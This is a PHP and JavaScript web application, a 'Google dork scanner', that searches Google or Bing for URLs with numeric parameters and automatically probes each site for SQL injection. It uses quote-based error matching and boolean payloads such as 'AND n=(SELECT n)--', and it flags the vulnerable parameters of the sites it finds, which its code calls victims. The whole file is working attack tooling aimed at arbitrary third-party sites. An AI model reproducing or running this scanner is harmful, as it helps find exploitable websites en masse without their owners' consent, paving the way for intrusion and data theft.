<?php
/*  Google dork scanner
*	yepss... you know what this is
*
*/


@error_reporting(0);
@set_time_limit(60);

function fetch($url) {
	if(!function_exists("curl_init")){
		$bu = trim(@file_get_contents($url));
		if($bu == "") return "";
		else return $bu;
	}

	$header[] = "Accept-Language: en";
	$header[] = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3";
	$header[] = "Connection: Keep-Alive";
	$header[] = "Pragma: no-cache";
	$header[] = "Cache-Control: no-cache";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE );
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 7);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

function sqlcheck($url_){
	// clean url
	$url_ = "http://".trim(str_ireplace("http://","",$url_));
	$url_ = str_ireplace("&amp;","&",$url_);
	$urls = explode("?",$url_);
	// check if url contains querystring
	if(count($urls)==2){
		$url = $urls[0];
		$querys = explode("&",$urls[1]);
		foreach($querys as $query){
			$vars = explode("=",$query);
			//echo $query;
			// check if parameter has a numeric value
			if((count($vars)>=2) && (is_numeric($vars[1]))){
				$final = str_replace($query,$query."%27",$url_);
				//echo $final;
				$content = fetch($final);
				if(preg_match("/sql syntax|sql error|right syntax to use near|syntax error converting|unclosed quotation|is not a valid MySQL result/i",$content)){
					return $vars[0];
				}
			}
		}
	}
	return ""; // gagal son
}
function sqlheavycheck($url_){
	// clean url
	$url_ = "http://".trim(str_ireplace("http://","",$url_));
	$url_ = str_ireplace("&amp;","&",$url_);

	// check if url contains querystring
	$pos = stripos($url_,"?");
	if($pos !== false){
		$url = substr($url_,0,$pos);
		$que = substr($url_,$pos+1);


		$querys = explode("&",$que);
		foreach($querys as $query){
			$vars = explode("=",$query);
			//echo $query;
			// check if parameter has a numeric value
			if((count($vars)>=2) && (is_numeric($vars[1]))){
				// and 1=(select 1)
				$acak = rand(1111,9999);
				$final = str_replace($query,$query."%20AND%20".$acak."%3D%28SELECT%20".$acak."%29--",$url_);
				$contrue = fetch($final);
				//echo "final1 : ".$final."<br />";

				// and 1=(select 0)
				$acak = rand(1111,9999);
				$final = str_replace($query,$query."%20AND%20".$acak."%3D%28SELECT%200%29--",$url_);
				//echo "final2 : ".$final."<br />";
				$confalse = fetch($final);

				$numtrue = strlen(strip_tags($contrue));
				$numfalse = strlen(strip_tags($confalse));
				$selisih = $numtrue - $numfalse;


				if($selisih >= 30){
					return $vars[0];
				}
				else{
					//' and 1=(select 1) and '1'='1
					$acak = rand(1111,9999);
					$final = str_replace($query,$query."%27%20AND%20".$acak."%3D%28SELECT%20".$acak."%29%20AND%20%271%27=%271",$url_);
					$contrue = fetch($final);
					//echo "final1 : ".$final."<br />";

					//' and 1=(select 0) and '1'='1
					$acak = rand(1111,9999);
					$final = str_replace($query,$query."%27%20AND%20".$acak."%3D%28SELECT%200%29%20AND%20%271%27=%271",$url_);
					//echo "final2 : ".$final."<br />";
					$confalse = fetch($final);

					$numtrue = strlen(strip_tags($contrue));
					$numfalse = strlen(strip_tags($confalse));
					$selisih = $numtrue - $numfalse;

					if($selisih >= 30){
						return $vars[0];
					}
				}
			}
		}
	}
	return ""; // gagal son... 
}


// debugging tools
if(isset($_GET['check'])&&($_GET['check']!="")){
$url = $_GET['check'];
echo $url." ".sqlcheck($url);
die();
}
if(isset($_GET['heavycheck'])&&($_GET['heavycheck']!="")){
$url = $_GET['heavycheck'];
echo $url." ".sqlheavycheck($url);
die();
}
// debugging tools end


if(isset($_GET['dork'])&&($_GET['dork']!="")){
	$gnum = 10; // jumlah hasil pencarian perhalaman
	$setype = "google"; // default cari pakek g00gle
	if(isset($_GET['setype'])) $setype = strtolower(trim($_GET['setype']));
	
	if(isset($_GET['page'])){
		$gpage = (int) $_GET['page'];
		if($gpage < 1) $gpage = 1;
	}
	else $gpage = 1;
	$gpage = ($gpage - 1) * $gnum;

	if($gpage > ($gpage * $gnum)){
		echo "_finish_|max only ".$gpage." results";
		die();
	}
	
	$dork = stripslashes($_GET['dork']);
	$dork = str_replace(" ","+",$dork);
	$dorki = urlencode($dork);
	
	if($setype == "google"){
		//g00gle nextbuttn---> <div class=med style=margin-top:2em>
		$gsearch = fetch("http://www.google.com/custom?num=".$gnum."&hl=en&cx=!009136828022434855111:b1vm8yfl888&q=".$dorki."&start=".$gpage."&sa=N");
		$raws = explode("<h2 class=r>",$gsearch);
		if((trim($gsearch) == "") || (count($raws) <= 1) || (preg_match("/div\sclass=med\sstyle=margin-top:2em/i",$gsearch))){
			echo "_finish_|no more search results from ".$setype;
			die();
		}
		
	}
	elseif($setype == "bing"){
		//bing nextbutton---> class="sb_pagN"
		$dorki = preg_replace("/^[^:]*:(.*)/i","\\1",$dork);
		$gsearch = fetch("http://www.bing.com/search?q=".$dorki."&filt=all&first=".$gpage."&FORM=PERE3");
		$raws = explode("<div class=\"sb_tlst\"><h3>",$gsearch);			
		if((trim($gsearch) == "") || (!preg_match("/class=\"sb_pagN\"/i",$gsearch)) || (count($raws) <= 1)){
			echo "_finish_|no more search results from ".$setype;
			die();
		}
	}
	else{
		echo "_finish_|search engine not supported";
		die();
	}

	foreach($raws as $korban){
		if(strlen($korban) >= 9 && (substr($korban,0,9)=="<a href=\"")){
			$heavy = false;
			if((isset($_GET['heavy'])) && ($_GET['heavy']=='1')) $heavy = true;

			$calon = substr($korban,9);
			$pos = strpos($calon,"\"");
			if($pos !== false){
				$url = trim(substr($calon,0,$pos));
				if(preg_match("/facebook\.|yahoo\.|google\.|youtube\./i",$url)) continue;
				if(!preg_match("/\w+=\d+/i",$url)) continue;
				
				if($heavy) {
					$vulnvar = sqlheavycheck($url);
					if($vulnvar != "") $laporan = "<a href=\"".$url."\" target=\"_".rand(1111,9999)."\"><span class=\"white\">".$url."</span><span class=\"red\"> @ </span><span class=\"white\">".$vulnvar."</span></a><br />";
					else $laporan = "<a href=\"".$url."\" target=\"_".rand(1111,9999)."\">".$url."</a><br />";
					echo $laporan;
					
				}
				else{
					$vulnvar = sqlcheck($url);
					if($vulnvar != "") $laporan = "<a href=\"".$url."\" target=\"_".rand(1111,9999)."\"><span class=\"white\">".$url."</span><span class=\"red\"> @ </span><span class=\"white\">".$vulnvar."</span></a><br />";
					else $laporan = "<a href=\"".$url."\" target=\"_".rand(1111,9999)."\">".$url."</a><br />";
					echo $laporan;
				}
			}
		}
	}
	die(); // mas kamu koq looyo...
}



?><html>
<head><title>SQLi Scanner</title>
<link rel="shortcut icon" href="../favicon.ico">
<!-- <?php echo date("Y",time()); ?> Revan Aditya -->
<script type="text/javascript">
jalan = false;
nomer = 1;
nomermax = 100;
heavy = false;

function ajax(vars, nom, cbFunction){
	var req = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("MSXML2.XMLHTTP.3.0");
	var querystring = '?' + vars + '&page=' + nom;
	req.open("GET", querystring , true);
	req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	req.onreadystatechange = function(){
		if (req.readyState == 4 && req.status == 200){
			if (req.responseText){
			  cbFunction(req.responseText,vars);
			}
		}
	}
	req.send(null);
}
function showResult(str, vars){
	var box = document.getElementById("result")
	if(str.match(/Warning|Fatal/gi)) box.innerHTML += '<span class=\"red\">*** </span> error...<br />';
	else box.innerHTML += str;

	if(!jalan){
		box.innerHTML += '<span class=\"red\">*** </span> paused...<br />';
		document.getElementById("loading").style.visibility = 'hidden';
		document.getElementById("btnOk").value = "Resume";
	}
	else {
		if(!str.match(/.*finish.*/gi)){
			sqlCheck(vars);
		}
		else{
			var pesan = str.substring(str.indexOf("|") + 1);
			box.innerHTML = '<span class=\"red\">*** </span> finish ( ' + pesan + ' )<br />';
			document.getElementById('setype').disabled = false;
			document.getElementById('dork').readOnly = false;
			document.getElementById("loading").style.visibility = 'hidden';
			document.getElementById("btnOk").value = "Search";
			nomer = 1;
			jalan = false;
		}
	}

	var oldYPos = 0, newYPos = 0;
	do{
		if (document.all){
			oldYPos = document.body.scrollTop;
		}
		else{
			oldYPos = window.pageYOffset;
		}
		window.scrollBy(0, 50);
		if (document.all){
			newYPos = document.body.scrollTop;
		}
		else{
			newYPos = window.pageYOffset;
		}
	} while (oldYPos < newYPos);
}
function keyHandler(ev){
	if (!ev){
		ev = window.event;
	}
	if (ev.which){
		keycode = ev.which;
	}
	else if (ev.keyCode){
		keycode = ev.keyCode;
	}
	if (keycode == 13){
		sikat();
	}
}
String.prototype.trim = function() {
	return this.replace(/^\s*|\s*$/g, "");
}
function sqlCheck(xdata){
	if(jalan){
		ajax(xdata, nomer, showResult);
		nomer++;
	}
}
function sqlHeavyCheck(xdata){
	if(jalan){
		ajax(xdata + '&heavy=1', nomer, showResult);
		nomer++;
	}
}
function sikat(){
	var btext = document.getElementById("btnOk");
	if((btext.value == 'Search') || (btext.value == 'Resume')){
		if(!jalan){
			if(btext.value == 'Search') nomer = 1;
			var target = document.getElementById('dork');
			var setype = document.getElementById('setype');
			if(target.value.trim().length>0) {
				document.getElementById("loading").style.visibility = 'visible';
				document.getElementById("btnOk").value = "Pause";
				target.readOnly = true;
				setype.disabled = true;
				jalan = true;
				sqlCheck('dork=' + encodeURIComponent(target.value) + '&setype=' + encodeURIComponent(setype.value));
			}
		}
		else alert("Please stop first...");
	}
	else {
		berhenti();
	}
}
function initpg(){
	document.onkeypress = keyHandler;
}
function berhenti(){
	jalan = false;
}
function bersih(){
	var tanya = confirm("Clear results and restart?");
	if(tanya == true) location.href = 'index.php';
}
function checkheavy_fix(){
	var heavyval = document.getElementById("heavy");
	if(heavyval.checked) heavyval.checked = false;
	else heavyval.checked = true;
	checkheavy();
}
function checkheavy(){
	var heavyval = document.getElementById("heavy").checked;
	var box = document.getElementById("result")
	if(heavyval) {
		heavy = true;
		box.innerHTML += '<span class=\"red\">*** </span> depth scan...<br />';
	}
	else {
		heavy = false;
		box.innerHTML += '<span class=\"red\">*** </span> quick scan...<br />';
	}
}

</script>
<style type="text/css">
*{
	background:url('../images/bg.gif') #111;
	font-family: Lucida Console,Tahoma;
	color:#bbb;
	font-size:11px;
	text-align:left;
}
input,select,textarea{
	border:0;
	border:1px solid #900;
	color:#fff;
	background:#000;
	margin:0;
	padding:2px 4px;
}
input:hover,textarea:hover,select:hover{
	background:#200;
	border:1px solid #f00;
}
option{
	background:#000;
}
.red{
	color:#f00;
}
.white{
	color:#fff;
}
a{
	text-decoration:none;
}
a:hover{
	border-bottom:1px solid #900;
	border-top:1px solid #900;
}
#status{
	width:100%;
	height:auto;
	padding:4px 0;
	border-bottom:1px solid #300;
}
#result a{
	color:#777;
}
.sign{
	color:#222;
}
#box{
	margin:10px 0 0 0;
}
</style>
</head>
<body onload="initpg();">



<div id="result"></div>
<div id="box">
<input type="text" name="dork" id="dork" value="" style="width:400px;" title="Give a keyword to search..." />
<select name="setype" id="setype">
	<option value="google" />Google</option>
	<option value="bing" />Bing</option>
</select>
<input type="submit" id="btnOk" name="btnOk" value="Search" onclick="sikat();" style="width:70px;text-align:center;" />
<input type="submit" name="btnClear" value="Restart" onclick="bersih();" style="width:70px;text-align:center;" />
<span class="sign">revres</span><span class="red">.</span><span class="sign">tanur</span>
<img src="../images/loading.gif" alt="" style="margin:0;padding:0;vertical-align:middle;visibility:hidden;" id="loading" title="loading..." />
<p><input onclick="checkheavy();" style="vertical-align:middle;margin:0 8px;padding:0;border:0;" type="checkbox" name="heavy" id="heavy" /><a style="vertical-align:middle;" href="javascript:checkheavy_fix();">Depth scan ( slow but sure )</a></p>
</div>


<!-- aku suka kamu suka sudah jangan bilang syapaa syapaaa... -->
</body>
</html>